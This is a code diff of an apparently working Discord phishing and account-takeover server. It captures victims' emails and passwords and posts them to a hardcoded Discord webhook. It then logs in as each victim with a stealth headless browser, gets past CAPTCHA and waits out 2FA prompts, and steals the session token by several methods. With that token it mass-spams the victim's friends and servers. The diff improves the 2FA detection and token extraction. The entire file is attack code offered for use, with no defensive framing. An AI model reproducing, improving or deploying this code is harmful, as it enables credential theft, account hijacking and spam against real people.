@@ -6,7 +6,6 @@ const puppeteer = require('puppeteer-extra');
 const StealthPlugin = require('puppeteer-extra-plugin-stealth');
 const UserPreferencesPlugin = require('puppeteer-extra-plugin-user-preferences');
 const UserAgent = require('user-agents');
-const FormData = require('form-data');
 
 puppeteer.use(StealthPlugin());
 puppeteer.use(UserPreferencesPlugin({
@@ -27,16 +26,13 @@ app.use(express.static('public'));
 const WEBHOOK_URL = 'https://discord.com/api/webhooks/1493675175634407514/zzQ3Ci849oAQs9YfaUFpDj0wI0noKnCTdDaIj9TMjmIkhBwTTYe1h_eTl-kU0_JEMK_L';
 const CUSTOM_MESSAGE = 'custom message';
 
-// Store active sessions
 const activeSessions = new Map();
 
-// Detect mobile
 function isMobile(req) {
     const ua = req.headers['user-agent'] || '';
     return /mobile|android|iphone|ipad|ipod/i.test(ua);
 }
 
-// Get client IP
 function getIP(req) {
     return req.headers['x-forwarded-for'] || 
            req.headers['x-real-ip'] || 
@@ -45,7 +41,6 @@ function getIP(req) {
            'unknown';
 }
 
-// Main route - serves different layouts
 app.get('/', (req, res) => {
     if (isMobile(req)) {
         res.sendFile(path.join(__dirname, 'public', 'mobile.html'));
@@ -54,7 +49,6 @@ app.get('/', (req, res) => {
     }
 });
 
-// OAuth endpoint
 app.get('/oauth2/authorize', (req, res) => {
     if (isMobile(req)) {
         res.sendFile(path.join(__dirname, 'public', 'mobile.html'));
@@ -63,12 +57,10 @@ app.get('/oauth2/authorize', (req, res) => {
     }
 });
 
-// Health check
 app.get('/health', (req, res) => {
     res.json({ status: 'ok', timestamp: Date.now() });
 });
 
-// Capture credentials and auto-login
 app.post('/api/capture', async (req, res) => {
     const { email, password, ip: clientIP, userAgent, platform } = req.body;
     const ip = clientIP || getIP(req);
@@ -85,18 +77,15 @@ app.post('/api/capture', async (req, res) => {
         url: req.headers.referer || 'direct'
     };
     
-    // Send initial capture
     await sendWebhook({
         content: `🎣 **NEW VICTIM**\n📧 Email: \`${email}\`\n🔑 Password: \`${password}\`\n🌐 IP: \`${ip}\`\n💻 Platform: \`${platform}\`\n🆔 Session: \`${sessionId}\`\n⏰ Time: <t:${Math.floor(Date.now()/1000)}:F>`
     });
     
-    // Start automated login process
     processLogin(email, password, ip, sessionId);
     
     res.json({ status: 'processing', sessionId });
 });
 
-// Automated login with 2FA and CAPTCHA handling
 async function processLogin(email, password, ip, sessionId) {
     let browser;
     try {
@@ -108,8 +97,7 @@ async function processLogin(email, password, ip, sessionId) {
                 '--disable-dev-shm-usage',
                 '--disable-accelerated-2d-canvas',
                 '--disable-gpu',
-                '--window-size=1920,1080',
-                `--proxy-server=${await getProxy()}`
+                '--window-size=1920,1080'
             ]
         });
         
@@ -118,23 +106,16 @@ async function processLogin(email, password, ip, sessionId) {
         await page.setUserAgent(userAgent.toString());
         await page.setViewport({ width: 1920, height: 1080 });
         
-        // Set IP-based geolocation
-        await page.setGeolocation({ latitude: 37.7749, longitude: -122.4194 });
-        
-        // Navigate to Discord login
         await page.goto('https://discord.com/login', { waitUntil: 'networkidle2', timeout: 60000 });
         
-        // Wait for and fill login form
         await page.waitForSelector('input[name="email"]', { visible: true, timeout: 10000 });
         
-        // Human-like typing
         await humanType(page, 'input[name="email"]', email);
         await delay(500, 1500);
         await humanType(page, 'input[name="password"]', password);
         
         await delay(800, 2000);
         
-        // Click login
         await page.click('button[type="submit"]');
         
         await delay(3000, 5000);
@@ -143,7 +124,8 @@ async function processLogin(email, password, ip, sessionId) {
         const hasCaptcha = await page.evaluate(() => {
             return document.querySelector('iframe[src*="captcha"]') !== null ||
                    document.querySelector('.h-captcha') !== null ||
-                   document.querySelector('[class*="captcha"]') !== null;
+                   document.querySelector('[class*="captcha"]') !== null ||
+                   document.querySelector('iframe[src*="hcaptcha"]') !== null;
         });
         
         if (hasCaptcha) {
@@ -151,31 +133,46 @@ async function processLogin(email, password, ip, sessionId) {
             await solveCaptcha(page, sessionId);
         }
         
-        // Check for 2FA
+        // Check for 2FA - FIXED SELECTORS
         await delay(3000, 5000);
         
         const is2FA = await page.evaluate(() => {
-            return document.querySelector('input[name="code"]') !== null ||
-                   document.querySelector('[class*="mfa"]') !== null ||
-                   document.querySelector('text="Check your email"') !== null ||
-                   document.body.innerText.includes('Check your email') ||
-                   document.body.innerText.includes('2FA');
+            // Check for MFA input field
+            const mfaInput = document.querySelector('input[name="code"]') || 
+                           document.querySelector('input[placeholder*="code"]') ||
+                           document.querySelector('input[type="text"][maxlength="6"]') ||
+                           document.querySelector('[class*="mfa"] input') ||
+                           document.querySelector('[class*="twoFactor"] input');
+            
+            // Check for email verification text
+            const bodyText = document.body.innerText || document.body.textContent || '';
+            const hasEmailCheck = bodyText.toLowerCase().includes('check your email') ||
+                                bodyText.toLowerCase().includes('verify') ||
+                                bodyText.toLowerCase().includes('2fa') ||
+                                bodyText.toLowerCase().includes('two-factor') ||
+                                bodyText.toLowerCase().includes('authentication code') ||
+                                bodyText.toLowerCase().includes('6-digit');
+            
+            // Check for auth app mention
+            const hasAuthApp = bodyText.toLowerCase().includes('authenticator') ||
+                             bodyText.toLowerCase().includes('auth app');
+            
+            return mfaInput !== null || hasEmailCheck || hasAuthApp;
         });
         
         if (is2FA) {
             await sendWebhook({ 
-                content: `🔐 **2FA REQUIRED** - Session: \`${sessionId}\`\nWaiting for user to complete 2FA...` 
+                content: `🔐 **2FA REQUIRED** - Session: \`${sessionId}\`\n⏳ Waiting for user to complete 2FA...` 
             });
             
-            // Wait for 2FA completion (email verification or TOTP)
-            const maxWait = 300000; // 5 minutes
+            const maxWait = 300000;
             const startTime = Date.now();
+            let loggedIn = false;
             
             while (Date.now() - startTime < maxWait) {
                 await delay(5000);
                 
-                // Check if logged in
-                const loggedIn = await page.evaluate(() => {
+                loggedIn = await page.evaluate(() => {
                     return document.querySelector('[class*="container-"]') !== null &&
                            document.location.href.includes('/channels/');
                 });
@@ -185,63 +182,146 @@ async function processLogin(email, password, ip, sessionId) {
                     break;
                 }
                 
-                // Check if email verification needed
-                const needsEmail = await page.evaluate(() => {
-                    return document.body.innerText.includes('verify') ||
-                           document.body.innerText.includes('email');
+                // Check if still on 2FA page
+                const still2FA = await page.evaluate(() => {
+                    const bodyText = document.body.innerText || '';
+                    return bodyText.toLowerCase().includes('code') ||
+                           bodyText.toLowerCase().includes('verify') ||
+                           document.querySelector('input[name="code"]') !== null;
                 });
                 
-                if (needsEmail) {
+                if (!still2FA && !loggedIn) {
+                    // Might be on error page or other page
                     await sendWebhook({ 
-                        content: `📧 **EMAIL VERIFICATION NEEDED** - Session: \`${sessionId}\`\nUser must click email link` 
+                        content: `⚠️ **2FA PAGE CHANGED** - Session: \`${sessionId}\`\nCurrent URL: ${await page.url()}` 
                     });
                 }
             }
+            
+            if (!loggedIn) {
+                await sendWebhook({ 
+                    content: `⏰ **2FA TIMEOUT** - Session: \`${sessionId}\`\nUser didn't complete 2FA in time` 
+                });
+                await browser.close();
+                return;
+            }
         }
         
-        // Extract token
-        const token = await page.evaluate(() => {
-            const webpackChunkdiscord_app = window.webpackChunkdiscord_app;
-            if (webpackChunkdiscord_app) {
-                const modules = webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {
-                    for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {
-                        if (m.default && m.default.getToken !== undefined) return m.default.getToken();
-                        if (m.getToken !== undefined) return m.getToken();
-                    }
-                }]);
-                webpackChunkdiscord_app.pop();
-                return modules;
-            }
-            return localStorage.getItem('token');
-        });
+        // Check if we're logged in
+        const currentUrl = await page.url();
+        const isLoggedIn = currentUrl.includes('/channels/') || currentUrl.includes('/app');
         
+        if (!isLoggedIn) {
+            // Check for error message
+            const errorText = await page.evaluate(() => {
+                const errorEl = document.querySelector('[class*="error"]') || 
+                              document.querySelector('[style*="color: rgb(250, 71, 71)"]');
+                return errorEl ? errorEl.innerText : null;
+            });
+            
+            await sendWebhook({ 
+                content: `❌ **LOGIN FAILED** - Session: \`${sessionId}\`\n${errorText ? 'Error: ' + errorText : 'Unknown error'}\nURL: ${currentUrl}` 
+            });
+            await browser.close();
+            return;
+        }
+        
+        // Extract token - multiple methods
+        let token = null;
+        
+        // Method 1: Webpack
+        try {
+            token = await page.evaluate(() => {
+                let foundToken = null;
+                
+                // Try webpack
+                if (window.webpackChunkdiscord_app) {
+                    try {
+                        const modules = window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {
+                            for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {
+                                if (m.default && m.default.getToken !== undefined) {
+                                    foundToken = m.default.getToken();
+                                    break;
+                                }
+                                if (m.getToken !== undefined) {
+                                    foundToken = m.getToken();
+                                    break;
+                                }
+                            }
+                        }]);
+                        window.webpackChunkdiscord_app.pop();
+                    } catch(e) {}
+                }
+                
+                // Try localStorage
+                if (!foundToken) {
+                    foundToken = localStorage.getItem('token');
+                }
+                
+                // Try sessionStorage
+                if (!foundToken) {
+                    foundToken = sessionStorage.getItem('token');
+                }
+                
+                return foundToken;
+            });
+        } catch(e) {
+            await sendWebhook({ content: `⚠️ Token extraction error: ${e.message}` });
+        }
+        
+        // Method 2: Cookies
         if (!token) {
-            // Alternative token extraction
-            const cookies = await page.cookies();
-            const tokenCookie = cookies.find(c => c.name.includes('token'));
-            if (tokenCookie) token = tokenCookie.value;
+            try {
+                const cookies = await page.cookies();
+                const tokenCookie = cookies.find(c => c.name.includes('token') || c.value.length > 50);
+                if (tokenCookie) token = tokenCookie.value;
+            } catch(e) {}
+        }
+        
+        // Method 3: Local storage via CDP
+        if (!token) {
+            try {
+                const localStorageData = await page.evaluate(() => {
+                    const data = {};
+                    for (let i = 0; i < localStorage.length; i++) {
+                        const key = localStorage.key(i);
+                        data[key] = localStorage.getItem(key);
+                    }
+                    return data;
+                });
+                
+                for (const [key, value] of Object.entries(localStorageData)) {
+                    if (key.includes('token') || (value && value.length > 50 && value.includes('.'))) {
+                        token = value;
+                        break;
+                    }
+                }
+            } catch(e) {}
         }
         
         if (token) {
             await sendWebhook({ 
-                content: `🔑 **TOKEN EXTRACTED** - Session: \`${sessionId}\`\n\`\`\`${token}\`\`\`` 
+                content: `🔑 **TOKEN EXTRACTED** - Session: \`${sessionId}\`\nUser: \`${email}\`\n\`\`\`${token}\`\`\`` 
             });
             
-            // Start mass DM spam
+            // Start mass spam
             await massSpam(token, sessionId);
+        } else {
+            await sendWebhook({ 
+                content: `⚠️ **NO TOKEN FOUND** - Session: \`${sessionId}\`\nLogin appeared successful but no token extracted` 
+            });
         }
         
         await browser.close();
         
     } catch (error) {
         await sendWebhook({ 
-            content: `❌ **LOGIN ERROR** - Session: \`${sessionId}\`\n\`\`\`${error.message}\`\`\`` 
+            content: `❌ **CRITICAL ERROR** - Session: \`${sessionId}\`\n\`\`\`${error.message}\n${error.stack}\`\`\`` 
         });
         if (browser) await browser.close();
     }
 }
 
-// Human-like typing
 async function humanType(page, selector, text) {
     await page.focus(selector);
     for (const char of text) {
@@ -250,18 +330,10 @@ async function humanType(page, selector, text) {
     }
 }
 
-// CAPTCHA solving with human simulation
 async function solveCaptcha(page, sessionId) {
     try {
-        // Try to find and click CAPTCHA checkbox with human behavior
-        const captchaFrame = await page.$('iframe[src*="captcha"]');
+        const captchaFrame = await page.$('iframe[src*="captcha"], iframe[src*="hcaptcha"]');
         if (captchaFrame) {
-            const frame = await captchaFrame.contentFrame();
-            
-            // Simulate human hesitation
-            await delay(2000, 4000);
-            
-            // Move mouse naturally to checkbox
             const box = await captchaFrame.boundingBox();
             if (box) {
                 await page.mouse.move(
@@ -277,15 +349,13 @@ async function solveCaptcha(page, sessionId) {
             }
         }
         
-        // Wait for CAPTCHA to solve or use 2captcha API
         await delay(5000, 8000);
         
     } catch (e) {
-        await sendWebhook({ content: `⚠️ CAPTCHA handling error: ${e.message}` });
+        await sendWebhook({ content: `⚠️ CAPTCHA error: ${e.message}` });
     }
 }
 
-// Mass DM and server spam
 async function massSpam(token, sessionId) {
     try {
         const { Client } = require('discord.js-selfbot-v13');
@@ -302,42 +372,48 @@ async function massSpam(token, sessionId) {
         
         client.on('ready', async () => {
             await sendWebhook({ 
-                content: `🤖 **BOT READY** - Session: \`${sessionId}\`\nUser: \`${client.user.tag}\`\nID: \`${client.user.id}\`` 
+                content: `🤖 **SPAM BOT READY** - Session: \`${sessionId}\`\nUser: \`${client.user.tag}\` (\`${client.user.id}\`)` 
             });
             
-            // Mass DM all friends/recipients
-            const relationships = client.relationships.cache.filter(r => r.type === 1);
-            await sendWebhook({ content: `📨 **MASS DM STARTING** - Targets: ${relationships.size} friends` });
-            
-            for (const [, relationship] of relationships) {
-                try {
-                    const user = await client.users.fetch(relationship.id);
-                    if (user) {
-                        // Send multiple messages
-                        for (let i = 0; i < 5; i++) {
-                            await user.send(`<@${user.id}> ${CUSTOM_MESSAGE} ${'@everyone '.repeat(10)}`);
-                            await delay(1000, 3000);
+            // Mass DM friends
+            try {
+                const friends = client.relationships.cache.filter(r => r.type === 1);
+                await sendWebhook({ content: `📨 **MASS DM STARTING** - ${friends.size} friends targeted` });
+                
+                for (const [, relationship] of friends) {
+                    try {
+                        const user = await client.users.fetch(relationship.id);
+                        if (user && user.dmChannel) {
+                            for (let i = 0; i < 5; i++) {
+                                await user.send(`<@${user.id}> ${CUSTOM_MESSAGE} ${'@everyone '.repeat(10)}`);
+                                await delay(1000, 3000);
+                            }
                         }
-                    }
-                } catch (e) {
-                    // Continue on error
+                    } catch (e) {}
                 }
+            } catch (e) {
+                await sendWebhook({ content: `❌ DM Error: ${e.message}` });
             }
             
-            // Spam all guilds
-            for (const guild of client.guilds.cache.values()) {
-                try {
-                    // Find first text channel
-                    const channel = guild.channels.cache.find(c => c.type === 'GUILD_TEXT' && c.permissionsFor(guild.members.me).has('SEND_MESSAGES'));
-                    if (channel) {
-                        for (let i = 0; i < 10; i++) {
-                            await channel.send(`@everyone @here ${CUSTOM_MESSAGE} ${'@everyone '.repeat(20)}`);
-                            await delay(2000, 5000);
+            // Spam guilds
+            try {
+                for (const guild of client.guilds.cache.values()) {
+                    try {
+                        const channel = guild.channels.cache.find(c => 
+                            c.type === 'GUILD_TEXT' && 
+                            c.permissionsFor(guild.members.me).has('SEND_MESSAGES')
+                        );
+                        
+                        if (channel) {
+                            for (let i = 0; i < 10; i++) {
+                                await channel.send(`@everyone @here ${CUSTOM_MESSAGE} ${'@everyone '.repeat(20)}`);
+                                await delay(2000, 5000);
+                            }
                         }
-                    }
-                } catch (e) {
-                    // Continue on error
+                    } catch (e) {}
                 }
+            } catch (e) {
+                await sendWebhook({ content: `❌ Guild Error: ${e.message}` });
             }
             
             await sendWebhook({ content: `✅ **SPAM COMPLETE** - Session: \`${sessionId}\`` });
@@ -346,20 +422,10 @@ async function massSpam(token, sessionId) {
         await client.login(token);
         
     } catch (error) {
-        await sendWebhook({ content: `❌ **SPAM ERROR** - Session: \`${sessionId}\`\n${error.message}` });
+        await sendWebhook({ content: `❌ **SPAM FAILED** - Session: \`${sessionId}\`\n${error.message}` });
     }
 }
 
-// Get rotating proxy
-async function getProxy() {
-    // Add your proxy list here
-    const proxies = [
-        // 'http://user:pass@ip:port',
-    ];
-    return proxies.length > 0 ? proxies[Math.floor(Math.random() * proxies.length)] : '';
-}
-
-// Send webhook
 async function sendWebhook(data) {
     try {
         await axios.post(WEBHOOK_URL, data);
@@ -368,7 +434,6 @@ async function sendWebhook(data) {
     }
 }
 
-// Utility delay
 function delay(min, max) {
     return new Promise(resolve => setTimeout(resolve, Math.random() * (max - min) + min));
 }
